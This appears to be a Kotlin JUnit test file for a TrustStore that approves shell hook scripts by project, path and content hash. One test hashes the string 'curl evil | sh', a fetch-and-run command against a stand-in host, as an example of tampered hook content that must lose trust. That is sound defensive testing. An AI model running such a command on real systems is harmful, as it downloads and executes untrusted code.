package org.appdevforall.shellhooks.engine

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class TrustStoreTest {
    private val store = MapStore()
    private val trust = TrustStore(store)
    private val project = File("/projects/app")
    private val sha = TrustStore.sha256("echo ok\n".toByteArray())

    @Test
    fun nothingIsTrustedUntilApproved() {
        assertFalse(trust.isTrusted(project, "file-saved", sha))
    }

    @Test
    fun approvalCoversThatPathWithThatContent() {
        trust.trust(project, "file-saved", sha)

        assertTrue(trust.isTrusted(project, "file-saved", sha))
    }

    @Test
    fun changedContentIsUntrustedAgain() {
        trust.trust(project, "file-saved", sha)

        assertFalse(trust.isTrusted(project, "file-saved", TrustStore.sha256("curl evil | sh\n".toByteArray())))
    }

    @Test
    fun approvalDoesNotCarryToAnotherPathOrProject() {
        trust.trust(project, "file-saved", sha)

        assertFalse(trust.isTrusted(project, "file-saved.d/other", sha))
        assertFalse(trust.isTrusted(File("/projects/other"), "file-saved", sha))
    }

    @Test
    fun reapprovingReplacesTheOldContent() {
        val newSha = TrustStore.sha256("echo new\n".toByteArray())
        trust.trust(project, "file-saved", sha)
        trust.trust(project, "file-saved", newSha)

        assertTrue(trust.isTrusted(project, "file-saved", newSha))
        assertFalse(trust.isTrusted(project, "file-saved", sha))
    }

    @Test
    fun revokeForgetsEveryApprovalForTheProject() {
        val other = File("/projects/other")
        trust.trust(project, "file-saved", sha)
        trust.trust(project, "build-failed", sha)
        trust.trust(other, "file-saved", sha)

        trust.revoke(project)

        assertFalse(trust.isTrusted(project, "file-saved", sha))
        assertFalse(trust.isTrusted(project, "build-failed", sha))
        assertTrue(trust.isTrusted(other, "file-saved", sha))
        assertEquals(listOf(TrustStore.canonical(other)), trust.trustedProjects())
    }

    @Test
    fun pathsWithTabsAndNewlinesRoundTrip() {
        val odd = "file-saved.d/a\tb\nc"
        trust.trust(project, odd, sha)
        trust.trust(project, "file-saved", sha)

        assertTrue(trust.isTrusted(project, odd, sha))
        assertEquals(2, trust.trustedCount(project))
    }

    @Test
    fun approvalSurvivesANewStoreOverTheSameData() {
        trust.trust(project, "file-saved", sha)

        assertTrue(TrustStore(store).isTrusted(project, "file-saved", sha))
    }

    @Test
    fun sha256IsLowercaseHex() {
        assertEquals("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", TrustStore.sha256(ByteArray(0)))
    }
}
